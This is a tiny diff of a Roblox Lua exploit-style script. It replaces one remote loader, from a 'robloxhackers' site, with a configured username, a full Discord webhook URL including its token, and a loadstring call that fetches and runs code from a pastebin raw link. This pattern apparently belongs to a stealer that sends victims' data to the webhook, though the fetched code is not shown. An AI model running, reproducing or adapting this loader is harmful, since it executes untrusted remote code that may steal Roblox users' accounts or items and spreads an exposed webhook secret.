@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://robloxhackers.tech/e4d4d9a27eaad862b24b0ad8.lua", true))()
+UserName = "AlaskaHighCommand"
+WebHook = "https://discord.com/api/webhooks/1301236256113557538/eHE6egnhhpMjYtXL7AZ6ZZITOZnooNv_H0Lcz6xQ-gp-6rsLb36VaEYyLdiN4g23OCJy"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/ahGVHZhj"))()
